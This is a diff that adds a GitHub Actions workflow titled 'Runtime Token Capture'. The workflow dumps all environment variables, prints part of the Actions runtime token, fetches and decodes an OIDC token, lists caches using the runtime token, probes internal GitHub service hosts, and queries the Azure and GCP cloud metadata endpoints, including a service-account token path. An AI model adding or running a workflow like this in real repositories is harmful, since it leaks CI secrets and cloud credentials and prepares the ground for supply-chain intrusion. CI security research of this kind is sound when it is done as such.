@@ -1,0 +1,99 @@
+name: Runtime Token Capture
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+jobs:
+  capture:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump ALL environment variables
+        run: |
+          echo "=== ALL ENV VARS ==="
+          env | sort
+          
+      - name: Capture runtime tokens
+        run: |
+          echo "=== ACTIONS_RUNTIME_TOKEN ==="
+          echo "Token length: ${#ACTIONS_RUNTIME_TOKEN}"
+          echo "First 20 chars: ${ACTIONS_RUNTIME_TOKEN:0:20}..."
+          
+          echo "=== ACTIONS_RUNTIME_URL ==="
+          echo "$ACTIONS_RUNTIME_URL"
+          
+          echo "=== ACTIONS_CACHE_URL ==="
+          echo "$ACTIONS_CACHE_URL"
+          
+          echo "=== ACTIONS_RESULTS_URL ==="
+          echo "${ACTIONS_RESULTS_URL:-not set}"
+          
+          echo "=== ACTIONS_ID_TOKEN_REQUEST_URL ==="
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
+          
+          echo "=== GITHUB_TOKEN scope ==="
+          curl -sS -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/ | python3 -c "import sys; print('OK')" 2>&1 || echo "Failed"
+          
+      - name: Test OIDC token
+        run: |
+          echo "=== OIDC TOKEN ==="
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>&1)
+            echo "$OIDC" | python3 -c "
+import sys, json, base64
+try:
+    data = json.loads(sys.stdin.read())
+    if 'value' in data:
+        parts = data['value'].split('.')
+        if len(parts) >= 2:
+            padding = '=' * (4 - len(parts[1]) % 4)
+            decoded = base64.urlsafe_b64decode(parts[1] + padding)
+            claims = json.loads(decoded)
+            for k, v in sorted(claims.items()):
+                print(f'  {k}: {v}')
+except Exception as e:
+    print(f'Error: {e}')
+"
+          fi
+          
+      - name: Test cache API access
+        run: |
+          echo "=== CACHE API ==="
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            # List caches via API
+            curl -sS -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" 2>&1 | python3 -c "
+import sys, json
+try:
+    data = json.loads(sys.stdin.read())
+    print(f'Total caches: {data.get(\"totalCount\", \"?\")}')
+    for c in data.get('artifactCaches', [])[:5]:
+        print(f'  Cache: {c.get(\"cacheKey\", \"?\")} ({c.get(\"scope\", \"?\")})')
+except Exception as e:
+    print(f'Error: {e}')
+"
+          fi
+          
+      - name: Test internal network
+        run: |
+          echo "=== INTERNAL SERVICES ==="
+          # Check if we can reach any internal GitHub services
+          for url in \
+            "https://pipelines.actions.githubusercontent.com" \
+            "https://results.actions.githubusercontent.com" \
+            "https://vstoken.actions.githubusercontent.com"; do
+            STATUS=$(curl -sS -o /dev/null -w "%{http_code}" --connect-timeout 3 "$url" 2>&1)
+            echo "  $url: $STATUS"
+          done
+          
+          echo "=== METADATA ENDPOINTS ==="
+          # Azure IMDS
+          curl -sS -H "Metadata: true" --connect-timeout 2 \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -5 || echo "IMDS: unreachable"
+          
+          # GCP Metadata
+          curl -sS -H "Metadata-Flavor: Google" --connect-timeout 2 \
+            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>&1 | head -5 || echo "GCP: unreachable"
+          
+          echo "=== DONE ==="
